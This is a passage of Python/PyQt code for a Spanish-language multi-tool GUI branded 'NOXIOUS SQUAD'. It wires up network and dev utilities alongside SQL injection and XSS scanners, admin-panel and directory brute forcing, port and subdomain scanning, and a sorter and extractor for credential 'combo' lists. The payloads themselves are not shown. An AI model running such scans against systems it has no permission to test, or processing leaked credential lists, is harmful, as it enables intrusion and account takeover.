        subnet_row.addWidget(subnet_field, stretch=1); subnet_row.addWidget(subnet_run)
        more_layout.addWidget(self._group("🧮 Subnet Calc", [subnet_w]))
        cidr_w = QWidget(); cidr_row = QHBoxLayout(cidr_w); cidr_row.setContentsMargins(0,0,0,0)
        cidr_field = QLineEdit(); cidr_field.setPlaceholderText("10.0.0.0/16")
        cidr_run = QPushButton("▶ CALC"); cidr_run.setObjectName("runBtn")
        cidr_run.clicked.connect(lambda: self._run_cidr(cidr_field))
        cidr_row.addWidget(cidr_field, stretch=1); cidr_row.addWidget(cidr_run)
        more_layout.addWidget(self._group("🔢 CIDR Calc", [cidr_w]))
        range_w = QWidget(); range_row = QHBoxLayout(range_w); range_row.setContentsMargins(0,0,0,0)
        range_start = QLineEdit(); range_start.setPlaceholderText("192.168.1.0")
        range_end = QLineEdit(); range_end.setPlaceholderText("192.168.1.255")
        range_run = QPushButton("▶ CONVERT"); range_run.setObjectName("runBtn")
        range_run.clicked.connect(lambda: self._run_iprange(range_start, range_end))
        range_row.addWidget(range_start, stretch=1); range_row.addWidget(range_end, stretch=1); range_row.addWidget(range_run)
        more_layout.addWidget(self._group("📏 IP Range to CIDR", [range_w]))
        ipincidr_w = QWidget(); ipincidr_row = QHBoxLayout(ipincidr_w); ipincidr_row.setContentsMargins(0,0,0,0)
        ipincidr_ip = QLineEdit(); ipincidr_ip.setPlaceholderText("192.168.1.50")
        ipincidr_cidr = QLineEdit(); ipincidr_cidr.setPlaceholderText("192.168.1.0/24")
        ipincidr_run = QPushButton("▶ CHECK"); ipincidr_run.setObjectName("runBtn")
        ipincidr_run.clicked.connect(lambda: self._run_ipincidr(ipincidr_ip, ipincidr_cidr))
        ipincidr_row.addWidget(ipincidr_ip, stretch=1); ipincidr_row.addWidget(ipincidr_cidr, stretch=1); ipincidr_row.addWidget(ipincidr_run)
        more_layout.addWidget(self._group("📍 IP in CIDR", [ipincidr_w]))
        special_w = QWidget(); special_row = QHBoxLayout(special_w); special_row.setContentsMargins(0,0,0,0)
        special_field = QLineEdit(); special_field.setPlaceholderText("127.0.0.1 o 192.168.1.1 o 8.8.8.8")
        special_run = QPushButton("▶ ANALIZAR"); special_run.setObjectName("runBtn")
        special_run.clicked.connect(lambda: self._run_special(special_field))
        special_row.addWidget(special_field, stretch=1); special_row.addWidget(special_run)
        more_layout.addWidget(self._group("⭐ Special IP (privada, loopback, etc)", [special_w]))
        down2_w = QWidget(); down2_row = QHBoxLayout(down2_w); down2_row.setContentsMargins(0,0,0,0)
        down2_field = QLineEdit(); down2_field.setPlaceholderText("https://example.com")
        down2_run = QPushButton("▶ CHECK"); down2_run.setObjectName("runBtn")
        down2_run.clicked.connect(lambda: self._run_down(down2_field))
        down2_row.addWidget(down2_field, stretch=1); down2_row.addWidget(down2_run)
        more_layout.addWidget(self._group("🔌 Down? - ¿Sitio Caído?", [down2_w]))
        bulk_w = QWidget(); bulk_row = QHBoxLayout(bulk_w); bulk_row.setContentsMargins(0,0,0,0)
        bulk_field = QTextEdit(); bulk_field.setPlaceholderText("IPs separadas por coma, espacio o línea: 8.8.8.8, 1.1.1.1, 9.9.9.9"); bulk_field.setFixedHeight(60)
        bulk_run = QPushButton("▶ BULK LOOKUP (50 max)"); bulk_run.setObjectName("runBtn")
        bulk_run.clicked.connect(lambda: self._run_bulk(bulk_field))
        bulk_row2 = QHBoxLayout(); bulk_row2.addWidget(bulk_field, stretch=1); bulk_row2.addWidget(bulk_run)
        bulk_container = QWidget(); bulk_container.setLayout(bulk_row2)
        more_layout.addWidget(self._group("📦 Bulk Lookup", [bulk_container]))
        bingo_w = QWidget(); bingo_row = QHBoxLayout(bingo_w); bingo_row.setContentsMargins(0,0,0,0)
        bingo_run = QPushButton("🎲 GENERAR BINGO"); bingo_run.setObjectName("runBtn")
        bingo_run.clicked.connect(lambda: self._run_bingo())
        bingo_row.addWidget(bingo_run)
        more_layout.addWidget(self._group("🎲 Bingo (Seguridad)", [bingo_w]))
        more_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(more), "📦 Más")

        dev = QWidget(); dev_layout = QVBoxLayout(dev); dev_layout.setContentsMargins(10,10,10,10); dev_layout.setSpacing(8)
        b64_w = QWidget(); b64_layout = QVBoxLayout(b64_w); b64_layout.setContentsMargins(0,0,0,0)
        b64_in = QTextEdit(); b64_in.setPlaceholderText("Texto a codificar/deco..."); b64_in.setFixedHeight(60)
        b64_out = QTextEdit(); b64_out.setReadOnly(True); b64_out.setPlaceholderText("Resultado..."); b64_out.setFixedHeight(60)
        b64_btns = QWidget(); b64_row = QHBoxLayout(b64_btns); b64_row.setContentsMargins(0,0,0,0)
        b64_enc = QPushButton("🔒 Encode"); b64_enc.clicked.connect(lambda: b64_out.setPlainText(Base64Tool().encode(b64_in.toPlainText())))
        b64_dec = QPushButton("🔓 Decode"); b64_dec.clicked.connect(lambda: b64_out.setPlainText(Base64Tool().decode(b64_in.toPlainText())))
        b64_enc_url = QPushButton("🔗 URLSafe Enc"); b64_enc_url.clicked.connect(lambda: b64_out.setPlainText(Base64Tool().encode(b64_in.toPlainText(), urlsafe=True)))
        b64_row.addWidget(b64_enc); b64_row.addWidget(b64_dec); b64_row.addWidget(b64_enc_url)
        b64_layout.addWidget(b64_in); b64_layout.addWidget(b64_btns); b64_layout.addWidget(b64_out)
        dev_layout.addWidget(self._group("🔤 Base64 (std + URLSafe)", b64_layout))
        json_w = QWidget(); json_layout = QVBoxLayout(json_w); json_layout.setContentsMargins(0,0,0,0)
        json_in = QTextEdit(); json_in.setPlaceholderText('{"key": "value"}'); json_in.setFixedHeight(70)
        json_out = QTextEdit(); json_out.setReadOnly(True); json_out.setFixedHeight(70)
        json_btns = QWidget(); json_row = QHBoxLayout(json_btns); json_row.setContentsMargins(0,0,0,0)
        json_fmt = QPushButton("✨ Formatear"); json_fmt.clicked.connect(lambda: json_out.setPlainText(JSONTool().format(json_in.toPlainText())))
        json_min = QPushButton("📦 Minificar"); json_min.clicked.connect(lambda: json_out.setPlainText(JSONTool().format(json_in.toPlainText(), minify=True)))
        json_val = QPushButton("✅ Validar"); json_val.clicked.connect(lambda: self.log_block("📋", "JSON Validate", JSONTool().validate(json_in.toPlainText()), level="success" if JSONTool().validate(json_in.toPlainText()).get("valid") else "error"))
        json_row.addWidget(json_fmt); json_row.addWidget(json_min); json_row.addWidget(json_val)
        json_layout.addWidget(json_in); json_layout.addWidget(json_btns); json_layout.addWidget(json_out)
        dev_layout.addWidget(self._group("📋 JSON (format, minify, validate)", json_layout))
        hash_w = QWidget(); hash_row = QHBoxLayout(hash_w); hash_row.setContentsMargins(0,0,0,0)
        hash_field = QLineEdit(); hash_field.setPlaceholderText("Texto para hashear")
        hash_combo = QComboBox(); hash_combo.addItems(["all","md5","sha1","sha256","sha512","sha3_256","blake2b"])
        hash_run = QPushButton("▶ HASH"); hash_run.setObjectName("runBtn")
        hash_run.clicked.connect(lambda: self._run_hash2(hash_field, hash_combo))
        hash_row.addWidget(hash_field, stretch=1); hash_row.addWidget(hash_combo); hash_row.addWidget(hash_run)
        dev_layout.addWidget(self._group("🔐 Hash (MD5, SHA*, BLAKE2b)", [hash_w]))
        url_w = QWidget(); url_layout = QVBoxLayout(url_w); url_layout.setContentsMargins(0,0,0,0)
        url_in = QLineEdit(); url_in.setPlaceholderText("https://ejemplo.com/?q=hola mundo")
        url_out = QLineEdit(); url_out.setReadOnly(True)
        url_btns = QWidget(); url_row = QHBoxLayout(url_btns); url_row.setContentsMargins(0,0,0,0)
        url_enc = QPushButton("🔒 Encode"); url_enc.clicked.connect(lambda: url_out.setText(URLEncodeTool().encode(url_in.text())))
        url_dec = QPushButton("🔓 Decode"); url_dec.clicked.connect(lambda: url_out.setText(URLEncodeTool().decode(url_in.text())))
        url_row.addWidget(url_enc); url_row.addWidget(url_dec)
        url_layout.addWidget(url_in); url_layout.addWidget(url_btns); url_layout.addWidget(url_out)
        dev_layout.addWidget(self._group("🔗 URL Encode/Decode", [url_w]))
        jwt_w = QWidget(); jwt_row = QHBoxLayout(jwt_w); jwt_row.setContentsMargins(0,0,0,0)
        jwt_field = QLineEdit(); jwt_field.setPlaceholderText("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
        jwt_run = QPushButton("▶ DECODIFICAR"); jwt_run.setObjectName("runBtn")
        jwt_run.clicked.connect(lambda: self._run_jwt(jwt_field))
        jwt_row.addWidget(jwt_field, stretch=1); jwt_row.addWidget(jwt_run)
        dev_layout.addWidget(self._group("🎟️ JWT Decoder (sin verificar firma)", [jwt_w]))
        epoch_w = QWidget(); epoch_row = QHBoxLayout(epoch_w); epoch_row.setContentsMargins(0,0,0,0)
        epoch_field = QLineEdit(); epoch_field.setPlaceholderText("1700000000 o 2024-01-01 00:00:00")
        epoch_combo = QComboBox(); epoch_combo.addItems(["epoch→date","date→epoch","ahora"])
        epoch_run = QPushButton("▶ CONVERT"); epoch_run.setObjectName("runBtn")
        epoch_run.clicked.connect(lambda: self._run_epoch(epoch_field, epoch_combo))
        epoch_row.addWidget(epoch_field, stretch=1); epoch_row.addWidget(epoch_combo); epoch_row.addWidget(epoch_run)
        dev_layout.addWidget(self._group("⏰ Epoch Converter", [epoch_w]))
        uuid_w = QWidget(); uuid_row = QHBoxLayout(uuid_w); uuid_row.setContentsMargins(0,0,0,0)
        uuid_field = QLineEdit(); uuid_field.setPlaceholderText("UUID o vacío para generar")
        uuid_combo = QComboBox(); uuid_combo.addItems(["v4","v1","v3","v5","validar"])
        uuid_run = QPushButton("▶ GO"); uuid_run.setObjectName("runBtn")
        uuid_run.clicked.connect(lambda: self._run_uuid(uuid_field, uuid_combo))
        uuid_row.addWidget(uuid_field, stretch=1); uuid_row.addWidget(uuid_combo); uuid_row.addWidget(uuid_run)
        dev_layout.addWidget(self._group("🆔 UUID Tool", [uuid_w]))
        qr_w = QWidget(); qr_row = QHBoxLayout(qr_w); qr_row.setContentsMargins(0,0,0,0)
        qr_field = QLineEdit(); qr_field.setPlaceholderText("Texto para QR")
        qr_run = QPushButton("▶ GENERAR QR"); qr_run.setObjectName("runBtn")
        qr_run.clicked.connect(lambda: self._run_qr(qr_field))
        qr_row.addWidget(qr_field, stretch=1); qr_row.addWidget(qr_run)
        dev_layout.addWidget(self._group("🔳 QR Code", [qr_w]))
        emailh_w = QWidget(); emailh_row = QHBoxLayout(emailh_w); emailh_row.setContentsMargins(0,0,0,0)
        emailh_field = QTextEdit(); emailh_field.setPlaceholderText("Pega headers de email..."); emailh_field.setFixedHeight(60)
        emailh_run = QPushButton("▶ PARSEAR"); emailh_run.setObjectName("runBtn")
        emailh_run.clicked.connect(lambda: self._run_emailheaders(emailh_field))
        emailh_row2 = QHBoxLayout(); emailh_row2.addWidget(emailh_field, stretch=1); emailh_row2.addWidget(emailh_run)
        emailh_container = QWidget(); emailh_container.setLayout(emailh_row2)
        dev_layout.addWidget(self._group("📧 Email Headers Parser", [emailh_container]))
        ipconv_w = QWidget(); ipconv_row = QHBoxLayout(ipconv_w); ipconv_row.setContentsMargins(0,0,0,0)
        ipconv_field = QLineEdit(); ipconv_field.setPlaceholderText("8.8.8.8 o 134744072")
        ipconv_run = QPushButton("▶ CONVERTIR"); ipconv_run.setObjectName("runBtn")
        ipconv_run.clicked.connect(lambda: self._run_ipconv(ipconv_field))
        ipconv_row.addWidget(ipconv_field, stretch=1); ipconv_row.addWidget(ipconv_run)
        dev_layout.addWidget(self._group("🔄 IP Converter (dec, hex, bin)", [ipconv_w]))
        ipv6_w = QWidget(); ipv6_row = QHBoxLayout(ipv6_w); ipv6_row.setContentsMargins(0,0,0,0)
        ipv6_field = QLineEdit(); ipv6_field.setPlaceholderText("2001:db8::1")
        ipv6_run = QPushButton("▶ EXPANDIR"); ipv6_run.setObjectName("runBtn")
        ipv6_run.clicked.connect(lambda: self._run_ipv6(ipv6_field))
        ipv6_row.addWidget(ipv6_field, stretch=1); ipv6_row.addWidget(ipv6_run)
        dev_layout.addWidget(self._group("🌐 IPv6 Expand/Compress", [ipv6_w]))
        mac_w = QWidget(); mac_row = QHBoxLayout(mac_w); mac_row.setContentsMargins(0,0,0,0)
        mac_field = QLineEdit(); mac_field.setPlaceholderText("00:1A:2B:3C:4D:5E o vacío para generar")
        mac_combo = QComboBox(); mac_combo.addItems(["generar","validar","lookup"])
        mac_run = QPushButton("▶ GO"); mac_run.setObjectName("runBtn")
        mac_run.clicked.connect(lambda: self._run_mac(mac_field, mac_combo))
        mac_row.addWidget(mac_field, stretch=1); mac_row.addWidget(mac_combo); mac_row.addWidget(mac_run)
        dev_layout.addWidget(self._group("💻 MAC Tool", [mac_w]))
        dev_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(dev), "🧰 Dev Tools")

        detect = QWidget(); detect_layout = QVBoxLayout(detect); detect_layout.setContentsMargins(10,10,10,10); detect_layout.setSpacing(8)
        screen_w = QWidget(); screen_row = QHBoxLayout(screen_w); screen_row.setContentsMargins(0,0,0,0)
        screen_run = QPushButton("▶ DETECTAR PANTALLA"); screen_run.setObjectName("runBtn")
        screen_run.clicked.connect(lambda: self._run_screen())
        screen_row.addWidget(screen_run)
        detect_layout.addWidget(self._group("🖥️ Screen (resolución, DPI)", [screen_w]))
        ua_w = QWidget(); ua_row = QHBoxLayout(ua_w); ua_row.setContentsMargins(0,0,0,0)
        ua_run = QPushButton("▶ MI USER-AGENT"); ua_run.setObjectName("runBtn")
        ua_run.clicked.connect(lambda: self._run_useragent())
        ua_row.addWidget(ua_run)
        detect_layout.addWidget(self._group("🌐 User Agent", [ua_w]))
        headers_w = QWidget(); headers_row = QHBoxLayout(headers_w); headers_row.setContentsMargins(0,0,0,0)
        headers_run = QPushButton("▶ MIS HEADERS "); headers_run.setObjectName("runBtn")
        headers_run.clicked.connect(lambda: self._run_headers())
        headers_row.addWidget(headers_run)
        detect_layout.addWidget(self._group("📋 Headers", [headers_w]))
        proxy2_w = QWidget(); proxy2_row = QHBoxLayout(proxy2_w); proxy2_row.setContentsMargins(0,0,0,0)
        proxy2_run = QPushButton("▶ PROXY CHECK"); proxy2_run.setObjectName("runBtn")
        proxy2_run.clicked.connect(lambda: self._run_proxycheck())
        proxy2_row.addWidget(proxy2_run)
        detect_layout.addWidget(self._group("🕵️ Proxy Check (VPN/Proxy detect)", [proxy2_w]))
        info_w = QWidget(); info_row = QHBoxLayout(info_w); info_row.setContentsMargins(0,0,0,0)
        info_run = QPushButton("▶ SYSTEM INFO"); info_run.setObjectName("runBtn")
        info_run.clicked.connect(lambda: self._run_sysinfo())
        info_row.addWidget(info_run)
        detect_layout.addWidget(self._group("💻 Info (Sistema, CPU, RAM)", [info_w]))
        tz_w = QWidget(); tz_row = QHBoxLayout(tz_w); tz_row.setContentsMargins(0,0,0,0)
        tz_run = QPushButton("▶ TIMEZONE"); tz_run.setObjectName("runBtn")
        tz_run.clicked.connect(lambda: self._run_timezone())
        tz_row.addWidget(tz_run)
        detect_layout.addWidget(self._group("⏰ Timezone", [tz_w]))
        lang_w = QWidget(); lang_row = QHBoxLayout(lang_w); lang_row.setContentsMargins(0,0,0,0)
        lang_run = QPushButton("▶ LANGUAGE"); lang_run.setObjectName("runBtn")
        lang_run.clicked.connect(lambda: self._run_language())
        lang_row.addWidget(lang_run)
        detect_layout.addWidget(self._group("🗣️ Language", [lang_w]))
        loc_w = QWidget(); loc_row = QHBoxLayout(loc_w); loc_row.setContentsMargins(0,0,0,0)
        loc_run = QPushButton("▶ LOCATION IP"); loc_run.setObjectName("runBtn")
        loc_run.clicked.connect(lambda: self._run_location())
        loc_row.addWidget(loc_run)
        detect_layout.addWidget(self._group("📍 Location", [loc_w]))
        ssl_w = QWidget(); ssl_row = QHBoxLayout(ssl_w); ssl_row.setContentsMargins(0,0,0,0)
        ssl_field = QLineEdit(); ssl_field.setPlaceholderText("google.com")
        ssl_run = QPushButton("▶ CHECK SSL/TLS"); ssl_run.setObjectName("runBtn")
        ssl_run.clicked.connect(lambda: self._run_ssl(ssl_field))
        ssl_row.addWidget(ssl_field, stretch=1); ssl_row.addWidget(ssl_run)
        detect_layout.addWidget(self._group("🔒 SSL/TLS (cert, cipher, días restantes)", [ssl_w]))
        detect_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(detect), "🔍 Detectar")

        osint = QWidget(); osint_layout = QVBoxLayout(osint); osint_layout.setContentsMargins(10, 10, 10, 10); osint_layout.setSpacing(8)
        ipinfo_w = QWidget(); ipinfo_row = QHBoxLayout(ipinfo_w); ipinfo_row.setContentsMargins(0,0,0,0)
        ipinfo_field = QLineEdit(); ipinfo_field.setPlaceholderText("8.8.8.8")
        ipinfo_run = QPushButton("▶ LOOKUP"); ipinfo_run.setObjectName("runBtn")
        ipinfo_run.clicked.connect(lambda: self._run_ipinfo(ipinfo_field))
        ipinfo_row.addWidget(ipinfo_field, stretch=1); ipinfo_row.addWidget(ipinfo_run)
        osint_layout.addWidget(self._group("🌐 IP Info", [ipinfo_w]))
        breach2_w = QWidget(); breach2_row = QHBoxLayout(breach2_w); breach2_row.setContentsMargins(0,0,0,0)
        breach2_field = QLineEdit(); breach2_field.setPlaceholderText("user@example.com")
        breach2_run = QPushButton("▶ BREACH CHECK"); breach2_run.setObjectName("runBtn")
        breach2_run.clicked.connect(lambda: self._run_breach2(breach2_field))
        breach2_row.addWidget(breach2_field, stretch=1); breach2_row.addWidget(breach2_run)
        osint_layout.addWidget(self._group("📧 Email Breach Check", [breach2_w]))
        username_w = QWidget(); username_row = QHBoxLayout(username_w); username_row.setContentsMargins(0,0,0,0)
        username_field = QLineEdit(); username_field.setPlaceholderText("username")
        username_run = QPushButton("▶ BUSCAR"); username_run.setObjectName("runBtn")
        username_run.clicked.connect(lambda: self._run_user(username_field))
        username_row.addWidget(username_field, stretch=1); username_row.addWidget(username_run)
        osint_layout.addWidget(self._group("👤 Username Search (15 plataformas)", [username_w]))
        news_w = QWidget(); news_row = QHBoxLayout(news_w); news_row.setContentsMargins(0,0,0,0)
        news_run = QPushButton("▶ NOTICIAS"); news_run.setObjectName("runBtn")
        news_run.clicked.connect(lambda: self._run_news())
        news_row.addWidget(news_run)
        osint_layout.addWidget(self._group("📰 News", [news_w]))
        sort_w = QWidget(); sort_row = QHBoxLayout(sort_w); sort_row.setContentsMargins(0,0,0,0)
        sort_field = QLineEdit(); sort_field.setPlaceholderText("Combo file")
        sort_browse = QPushButton("📂"); sort_browse.clicked.connect(lambda: self.browse_file(sort_field))
        sort_run = QPushButton("▶ SORT"); sort_run.setObjectName("runBtn")
        sort_run.clicked.connect(lambda: self._run_sort(sort_field))
        sort_row.addWidget(sort_field, stretch=1); sort_row.addWidget(sort_browse); sort_row.addWidget(sort_run)
        osint_layout.addWidget(self._group("🔀 Combo Sorter", [sort_w]))
        extract_w = QWidget(); extract_layout = QVBoxLayout(extract_w); extract_layout.setContentsMargins(0,0,0,0)
        extract_box = QTextEdit(); extract_box.setPlaceholderText("Pega texto con emails, combos, URLs, IPs, teléfonos..."); extract_box.setFixedHeight(70)
        extract_run = QPushButton("▶ EXTRACT"); extract_run.setObjectName("runBtn")
        extract_run.clicked.connect(lambda: self._run_extract(extract_box))
        extract_layout.addWidget(extract_box); extract_layout.addWidget(extract_run)
        osint_layout.addWidget(self._group("🔎 Extractor (emails, combos, IPs, URLs, phones)", extract_layout))
        osint_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(osint), "🕵️ OSINT")

        about = QWidget(); about_layout = QVBoxLayout(about); about_layout.setContentsMargins(20, 20, 20, 20); about_layout.setSpacing(12)
        about_title = QLabel("NOXIOUS SQUAD | ALL TOOLS")
        about_title.setStyleSheet("font-size: 26px; font-weight: 900; color: #A3FF3D;")
        about_title.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(about_title)
        about_ver = QLabel("v2.0 — Version - ")
        about_ver.setStyleSheet("font-size: 14px; color: #8BA98B; font-weight: 700;")
        about_ver.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(about_ver)
        about_desc = QLabel("Mas 50+ herramientas para seguridad, redes y privacidad.\nIncluye escaneo de vulnerabilidades, OSINT, Dev Tools y más.")
        about_desc.setStyleSheet("font-size: 13px; color: #E6F7E0; font-weight: 600; padding: 6px;")
        about_desc.setAlignment(Qt.AlignCenter)
        about_desc.setWordWrap(True)
        about_layout.addWidget(about_desc)
        sep2 = QFrame(); sep2.setFrameShape(QFrame.HLine); sep2.setStyleSheet("background: #2B362B; max-height: 1px;")
        about_layout.addWidget(sep2)
        creator_group = QGroupBox("👤 CREADOR"); creator_group.setStyleSheet("font-size: 13px; font-weight: 800; color: #A3FF3D;")
        creator_layout = QVBoxLayout(creator_group)
        lbl_creator = QLabel("Creado por: nscp12"); lbl_creator.setStyleSheet("font-size: 14px; font-weight: 800; color: #A3FF3D;"); creator_layout.addWidget(lbl_creator)
        lbl_disc = QLabel("Discord: nscp12"); lbl_disc.setStyleSheet("font-size: 13px; font-weight: 700; color: #E6F7E0;"); creator_layout.addWidget(lbl_disc)
        about_layout.addWidget(creator_group)
        links_group = QGroupBox("🔗 ENLACES OFICIALES"); links_group.setStyleSheet("font-size: 13px; font-weight: 800; color: #A3FF3D;")
        links_layout = QVBoxLayout(links_group)
        discord_btn2 = QPushButton("💬 Discord: discord.gg/Q6cknK8f3y"); discord_btn2.setStyleSheet("font-size: 12px; font-weight: 700; padding: 10px;")
        discord_btn2.clicked.connect(self.open_discord)
        links_layout.addWidget(discord_btn2)
        github_btn = QPushButton("⭐ GitHub: github.com/NOXIOUS-SQUAD"); github_btn.setStyleSheet("font-size: 12px; font-weight: 700; padding: 10px;")
        github_btn.clicked.connect(lambda: __import__("webbrowser").open("https://github.com/NOXIOUS-SQUAD"))
        links_layout.addWidget(github_btn)
        yt_btn = QPushButton("▶ YouTube: youtube.com/@NOXIOUS-SQUAD"); yt_btn.setStyleSheet("font-size: 12px; font-weight: 700; padding: 10px;")
        yt_btn.clicked.connect(lambda: __import__("webbrowser").open("https://www.youtube.com/@NOXIOUS-SQUAD"))
        links_layout.addWidget(yt_btn)
        about_layout.addWidget(links_group)
        about_layout.addStretch(1)
        about_footer = QLabel("© 2026 NOXIOUS SQUAD. Todos los derechos reservados.")
        about_footer.setStyleSheet("font-size: 10px; color: #8BA98B; font-weight: 600;")
        about_footer.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(about_footer)
        self.tabs.addTab(self._scroll_wrap(about), "ℹ️ About")

    def _group(self, title, widgets):
        group = QGroupBox(title)
        layout = QVBoxLayout(group)
        layout.setSpacing(6)
        if isinstance(widgets, (QVBoxLayout, QHBoxLayout, QFormLayout)):
            container = QWidget()
            container.setLayout(widgets)
            layout.addWidget(container)
        else:
            try:
                for w in widgets:
                    if isinstance(w, (QVBoxLayout, QHBoxLayout, QFormLayout)):
                        container = QWidget()
                        container.setLayout(w)
                        layout.addWidget(container)
                    else:
                        layout.addWidget(w)
            except TypeError:
                if isinstance(widgets, QWidget):
                    layout.addWidget(widgets)
                else:
                    layout.addWidget(QLabel(str(widgets)))
        return group

    def _run_sqli(self, field):
        url=field.text().strip()
        if not url:
            self.log_warning("⚠️ Ingresa una URL para SQLi scan")
            return
        self.log_info(f"💉 [SQLi] Escaneando {url} con 7 payloads...")
        def worker():
            results=SQLiScanner(log_cb=self.log).scan(url)
            if results:
                self.log_block("🔴", "SQLi - Vulnerabilidades Detectadas", {"URL": url, "Vulns": len(results), "Payloads": ", ".join(r['payload'][:20] for r in results[:3])}, level="error")
                for r in results[:5]:
                    self.log_error(f"  💥 {r['payload']} -> {r['type']}")
            else:
                self.log_success(f"✅ [SQLi] No se detectaron vulnerabilidades en {url} (no garantiza que esté limpio)")
        threading.Thread(target=worker, daemon=True).start()
    def _run_xss(self, field):
        url=field.text().strip()
        if not url: return
        self.log_info(f"⚔️ [XSS] Escaneando {url}...")
        def worker():
            results=XSSScanner(log_cb=self.log).scan(url)
            if results:
                self.log_block("🔴", "XSS - Reflejado Detectado", {"URL": url, "Casos": len(results)}, level="error")
                for r in results[:5]:
                    self.log_error(f"  💥 Payload reflejado: {r['payload'][:50]}")
            else:
                self.log_success(f"✅ [XSS] No se detectó XSS reflejado en {url}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_admin(self, field):
        url=field.text().strip()
        if not url: return
        self.log_info(f"🕵️ [Admin] Buscando paneles en {url} (30 paths)...")
        def worker():
            found=AdminFinder(log_cb=self.log).scan(url)
            self.log_block("🔍" if found else "ℹ️", "Admin Finder - Resultados", {"URL": url, "Rutas encontradas": len(found), "Paths probados": 30}, level="success" if found else "info")
            for item in found[:15]:
                lvl="success" if "[200]" in item else "warning"
                self.log_block("📂", "Ruta", {"Path": item}, level=lvl)
            if not found:
                self.log_info("  ℹ️ No se encontraron rutas comunes")
        threading.Thread(target=worker, daemon=True).start()
    def _run_dirbrute(self, url_field, wordlist_field):
        url=url_field.text().strip(); wl=wordlist_field.text().strip()
        if not url: return
        if not wl or not os.path.exists(wl):
            self.log_error("📁 [DirBrute] Selecciona un wordlist válido")
            return
        self.log_info(f"📁 [DirBrute] Iniciando brute force en {url}...")
        def worker():
            found=DirBrute(log_cb=self.log).scan(url, wl)
            self.log_block("📁", "DirBrute - Resultados", {"URL": url, "Encontrados": len(found)}, level="success" if found else "info")
            for item in found[:20]:
                self.log_success(f"  📂 {item}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_sub(self, field):
        domain=field.text().strip()
        if not domain: return
        self.log_info(f"🌐 [Subdomain] Escaneando {domain}...")
        def worker():
            found=SubdomainScanner(log_cb=self.log).scan(domain)
            self.log_block("🌐", "Subdomain Scanner", {"Dominio": domain, "Encontrados": len(found)}, level="success" if found else "info")
            for item in found[:20]:
                self.log_success(f"  🌐 {item}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_ipscan(self, field):
        ip=field.text().strip()
        if not ip: return
        self.log_info(f"📡 [IPScanner] Escaneando rango {ip}...")
        def worker():
            results=IPScanner().scan(ip)
            self.log_block("📡", "IP Scanner", {"Rango": ip, "Puertos abiertos": len(results)}, level="info")
            for item in results[:20]:
                self.log_success(f"  🔓 {item}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_portscan(self, field):
        host=field.text().strip()
        if not host: return
        self.log_info(f"🔍 [PortScan] Escaneando {host} puertos 1-1000...")
        def worker():
            results=PortScanner().scan(host, 1, 1000)
            self.log_block("🔍", "Port Scanner (Local + )", {"Host": host, "Abiertos": len(results)}, level="info")
            for item in results[:30]:
                self.log_success(f"  🔓 {item}")
            if not results:
                self.log_info("  ℹ️ No se encontraron puertos abiertos en 1-1000")
        threading.Thread(target=worker, daemon=True).start()
    def _run_dns(self, field):
        domain=field.text().strip()
        if not domain: return
        self.log_info(f"📡 [DNS] Consultando {domain}...")
        def worker():
            data=DNSLookup().lookup(domain)
            self.log_block("📡", f"DNS Lookup - {domain}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_proxy(self, field):
        path=field.text().strip()
        if not path or not os.path.exists(path):
            self.log_error("[Proxy] Archivo no encontrado")
            return
        def worker():
            proxies=[line.strip() for line in open(path, "r", encoding="utf-8", errors="ignore") if line.strip()]
            self.log_info(f"🔍 [Proxy] Probando {len(proxies)} proxies...")
            results=ProxyChecker().check(proxies)
            self.log_block("🔍", "Proxy Checker", {"Probados": len(proxies), "✅ Funcionando": len(results), "❌ Caídos": len(proxies)-len(results)}, level="success" if results else "warning")
            for item in results[:20]:
                self.log_success(f"  ✅ {item}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_sort(self, field):
        path=field.text().strip()
        if not path or not os.path.exists(path):
            self.log_error("[Sort] Archivo no encontrado")
            return
        try:
            lines=[line.strip() for line in open(path, "r", encoding="utf-8", errors="ignore")]
            hits, free=ComboSorter().sort(lines)
            ts=datetime.now().strftime("%H%M%S")
            Utils.save_file(f"sorted_hits_{ts}.txt", "\n".join(hits))
            Utils.save_file(f"sorted_free_{ts}.txt", "\n".join(free))
            self.log_block("🔀", "Combo Sorter", {"Hits": len(hits), "Free": len(free), "Archivos": f"sorted_hits_{ts}.txt / sorted_free_{ts}.txt"}, level="info")
        except Exception as e:
            self.log_error(f"[Sort] Error: {e}")
    def _run_extract(self, box):
        text=box.toPlainText().strip()
        if not text:
            self.log_warning("🔎 Ingresa texto para extraer")
            return
        emails, combos, ips, urls, phones=Extractor().extract(text)
        self.log_block("🔎", "Extractor", {"📧 Emails": len(emails), "🔑 Combos": len(combos), "🌐 IPs": len(ips), "🔗 URLs": len(urls), "📞 Teléfonos": len(phones)}, level="info")
        if emails: self.log_success(f"  📧 Emails: {', '.join(emails[:5])}")
        if ips: self.log_success(f"  🌐 IPs: {', '.join(ips[:5])}")
    def _run_encode(self, box_in, box_out, method):
        text=box_in.toPlainText().strip()
        if not text: return
        value=getattr(Encoder(), method)(text)
        box_out.setPlainText(str(value))
        self.log_success(f"🔤 [{method}] {text[:30]} -> {str(value)[:50]}")
    def _run_hash(self, field):
        text=field.text().strip()
        if not text: return
        data=HashGen().generate(text)
        self.log_block("🔐", f"Hash - '{text[:20]}'", data, level="info")
    def _run_hash2(self, field, combo):
        text=field.text().strip()
        if not text: return
        algo=combo.currentText()
        if algo=="all":
            data=HashGen().generate(text)
            self.log_block("🔐", f"Hash ALL - '{text[:20]}'", data, level="info")
        else:
            h=HashTool().hash(text, algo)
            self.log_block("🔐", f"Hash {algo.upper()}", {"Input": text[:40], "Hash": h}, level="info")
    def _run_ipinfo(self, field):
        ip=field.text().strip()
        if not ip: return
        self.log_info(f"🌐 [IPInfo] Consultando {ip} ...")
        def worker():
            data=IPInfo().lookup(ip)
            self.log_block("🌐", f"IP Info - {ip}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
